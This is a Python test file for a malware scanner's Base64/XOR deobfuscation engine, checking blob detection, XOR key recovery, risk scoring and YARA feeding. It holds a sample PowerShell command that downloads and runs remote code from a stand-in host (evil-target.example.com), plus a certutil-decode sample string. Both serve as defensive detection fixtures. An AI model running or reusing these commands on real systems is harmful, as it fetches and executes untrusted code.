"""Tests for the Base64/XOR deobfuscation engine (Phase 2, item 2).

Anti-AV discipline: payload bytes are assembled at runtime (Base64 of strings
built in code) so no malicious-looking literals are written to disk. The
YARA-feed test is gated on ``NEEDS_YARA`` because ``yara-python`` has no cp314
wheel on the local runner yet.
"""

import base64
import os

import pytest

from modules import deobfuscation
from modules.deobfuscation import analyze_deobfuscation
from modules.risk import calculate_risk

NEEDS_YARA = pytest.mark.skipif(
    __import__("modules.yara_engine", fromlist=["yara"]).yara is None,
    reason="yara-python not installed (requirements-yara.txt)",
)

_PS_PAYLOAD = "powershell -noProfile -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil-target.example.com/payload.exe')\""


def _b64(text):
    raw = text.encode("utf-8") if isinstance(text, str) else bytes(text)
    return base64.b64encode(raw)


def _content(payload, prefix=b"junk-before ", suffix=b" trailing"):
    return prefix + payload + suffix


def _write(target, content):
    target.write_bytes(content)
    return str(target)


def test_base64_blob_detected_and_flagged_with_content(tmp_path):
    sample = tmp_path / "sample.bin"
    result = analyze_deobfuscation(_write(sample, _content(_b64(_PS_PAYLOAD))))
    assert result["available"] is True
    assert result["blob_count"] == 1
    assert result["detected_total"] == 1
    assert result["flagged"] is True
    assert any("powershell" in reason.lower() for reason in result["flag_reasons"])
    assert result["base64_blobs"][0]["kind"] == "base64"
    assert result["base64_blobs"][0]["offset"] > 0
    assert result["base64_blobs"][0]["decoded_size"] >= len(_PS_PAYLOAD)
    assert "powershell" in result["base64_blobs"][0]["sample"].lower()


def test_content_param_matches_file_read(tmp_path):
    sample = tmp_path / "sample.bin"
    _write(sample, _content(_b64(_PS_PAYLOAD)))
    from_file = analyze_deobfuscation(str(sample))
    from_buffer = analyze_deobfuscation(str(sample), content=sample.read_bytes())
    summary = lambda r: {k: r[k] for k in ("blob_count", "xor_count", "flagged", "detected_total")}
    assert summary(from_file) == summary(from_buffer)
    assert from_file["flag_reasons"] == from_buffer["flag_reasons"]


def test_base64_plain_text_not_flagged(tmp_path):
    benign = "the quick brown fox jumps over the lazy dog while the moon rises 0123456789"
    result = analyze_deobfuscation(_write(tmp_path / "sample.bin", _content(_b64(benign))))
    assert result["blob_count"] == 1
    assert result["flagged"] is False
    assert result["flag_reasons"] == []


def test_short_base64_runs_are_ignored(tmp_path):
    result = analyze_deobfuscation(_write(tmp_path / "sample.bin", b"abcabcabcabc " * 4))
    assert result["blob_count"] == 0


def test_xor_single_byte_key_recovered(tmp_path):
    key = 0xFF
    plaintext = b"gateway rotated token; powershell -c \"Invoke-Expression 'certutil -decode'\"; handoff complete"
    obfuscated = bytes(byte ^ key for byte in plaintext)
    result = analyze_deobfuscation(_write(tmp_path / "sample.bin", obfuscated))
    assert result["xor_count"] == 1
    entry = result["xor_blobs"][0]
    assert entry["kind"] == "xor"
    assert entry["key"] == key
    assert entry["printable_ratio"] >= 0.9
    assert result["flagged"] is True


def test_plain_text_skips_xor_and_short_runs(tmp_path):
    content = b"hello world concern hello world concern hello world concern"
    result = analyze_deobfuscation(_write(tmp_path / "sample.bin", content))
    assert result["xor_count"] == 0
    assert result["blob_count"] == 0
    assert result["flagged"] is False


def test_random_binary_no_false_positives(tmp_path):
    result = analyze_deobfuscation(_write(tmp_path / "sample.bin", os.urandom(4096)))
    assert result["detected_total"] == 0
    assert result["flagged"] is False


def test_huge_base64_blob_decoded_in_bounded_prefix(tmp_path):
    long_text = ("lorem ipsum dolor sit amet consectetur adipiscing elit \n" * 40000).encode("utf-8")
    blob = base64.b64encode(long_text)
    assert len(blob) > deobfuscation.MAX_RAW_B64
    result = analyze_deobfuscation(_write(tmp_path / "sample.bin", blob))
    assert result["blob_count"] == 1
    decoded_size = result["base64_blobs"][0]["decoded_size"]
    assert decoded_size <= (deobfuscation.MAX_RAW_B64 // 4) * 3
    assert result["decoded_bytes_processed"] <= deobfuscation.MAX_RAW_B64


def test_feed_blobs_and_report_counters_are_capped(tmp_path):
    payloads = [_b64(f"payload-{i}-of-six-distinct-entries") for i in range(6)]
    content = b" ".join(payloads)
    result = analyze_deobfuscation(_write(tmp_path / "sample.bin", content))
    assert result["blob_count"] <= deobfuscation.MAX_BASE64_BLOBS
    assert result["feed_blobs_count"] <= deobfuscation.MAX_FEED_BLOBS
    assert result["detected_total"] >= 6


def test_feed_blobs_are_bytes(tmp_path):
    result = analyze_deobfuscation(_write(tmp_path / "sample.bin", _content(_b64(_PS_PAYLOAD))))
    assert all(isinstance(blob, (bytes, bytearray)) for blob in result["feed_blobs"])
    assert all(len(blob) <= deobfuscation.MAX_FEED_BLOB_SIZE for blob in result["feed_blobs"])


def test_embedded_pe_header_in_decoded_content_flags_blob(tmp_path):
    exe_lead = b"MZ" + b"\x90\x00" + b"\x00" * 32
    result = analyze_deobfuscation(_write(tmp_path / "sample.bin", _b64(exe_lead)))
    assert result["flagged"] is True
    assert any("MZ" in reason for reason in result["flag_reasons"])


def test_calculate_risk_adds_deobfuscation_factor():
    baseline = calculate_risk(False, {"status": "not_selected"}, "NORMAL", [], None, iocs={})
    flagged = calculate_risk(
        False, {"status": "not_selected"}, "NORMAL", [], None, iocs={},
        deobfuscation_analysis={"flagged": True, "flag_reasons": ["decoded payload string 'powershell'"]},
    )
    assert flagged["score"] == baseline["score"] + 10
    assert any(factor.startswith("Deobfuscation:") and "(+10)" in factor for factor in flagged["factors"])
    assert calculate_risk(
        False, {"status": "not_selected"}, "NORMAL", [], None, iocs={},
        deobfuscation_analysis={"flagged": False},
    )["score"] == baseline["score"]


def _pipeline_config(tmp_path, **overrides):
    config = {
        "blacklist": True, "virustotal": False, "strings": False, "ioc_extract": False,
        "entropy": False, "magic_numbers": False, "pe_analysis": False,
        "deobfuscation": True, "yara": False,
        "gerar_report": True, "report_format": "json", "output_dir": str(tmp_path / "reports"),
        "quiet": True, "workers": 1, "cache_enabled": False, "max_file_size": 0,
        "skip_reparse_points": True,
    }
    config.update(overrides)
    return config


def test_pipeline_flags_decoded_payload_and_raises_risk(tmp_path):
    from analyzer import analyze_file
    sample = tmp_path / "payload.bin"
    sample.write_bytes(_content(_b64(_PS_PAYLOAD)))
    result = analyze_file(str(sample), _pipeline_config(tmp_path), show_details=False)
    assert result["success"] is True
    deobf = result["details"]["deobfuscation"]
    assert deobf["flagged"] is True
    assert deobf["blob_count"] == 1
    assert "feed_blobs" not in deobf
    assert result["risk"]["score"] == 10
    assert any(factor.startswith("Deobfuscation:") for factor in result["risk"]["factors"])


def test_pipeline_feeds_iocs_from_decoded_view(tmp_path):
    from analyzer import analyze_file
    url = "http://evil-target.example.com/payload.exe"
    sample = tmp_path / "payload.bin"
    sample.write_bytes(_content(_b64(f"stage-one {url} phase-two")))
    result = analyze_file(
        str(sample),
        _pipeline_config(tmp_path, ioc_extract=True, strings=True),
        show_details=False,
    )
    iocs = result["details"]["iocs"]
    assert url in iocs.get("urls", [])


def test_scan_decoded_blobs_with_fake_yara(tmp_path, monkeypatch):
    from analyzer import _scan_decoded_blobs

    assert _scan_decoded_blobs(None, {}) == []
    assert _scan_decoded_blobs({"feed_blobs": []}, {}) == []

    fake_matches = [{"rule": "r", "tags": [], "namespace": "default", "severity": "medium", "points": 10}]

    def fake_scan(path, config):
        return {"available": True, "match_count": 1, "matches": fake_matches}

    monkeypatch.setattr("modules.yara_engine.scan_yara", fake_scan)
    tagged = _scan_decoded_blobs({"feed_blobs": [b"one", b"two"]}, {})
    assert len(tagged) == 2
    assert all(match["decoded"] is True for match in tagged)
    assert [match["source_blob"] for match in tagged] == [0, 1]


@NEEDS_YARA
def test_pipeline_yara_finds_marker_only_in_decoded_view(tmp_path):
    from analyzer import analyze_file

    rules_dir = tmp_path / "rules"
    rules_dir.mkdir()
    (rules_dir / "decoded.yar").write_text(
        'rule cerberus_decoded_hit { strings: $a = "CERBERUS-DECODED-MARKER" condition: $a }\n'
    )
    sample = tmp_path / "payload.bin"
    sample.write_bytes(_content(_b64("lead-in CERBERUS-DECODED-MARKER trail-out")))
    result = analyze_file(
        str(sample),
        _pipeline_config(tmp_path, yara=True, yara_rules_dir=str(rules_dir), yara_timeout=2.0),
        show_details=False,
    )
    yara_result = result["details"]["yara"]
    assert yara_result["available"] is True
    assert yara_result["decoded_match_count"] == 1
    assert yara_result["matches"][-1]["decoded"] is True
    assert yara_result["matches"][-1]["rule"] == "cerberus_decoded_hit"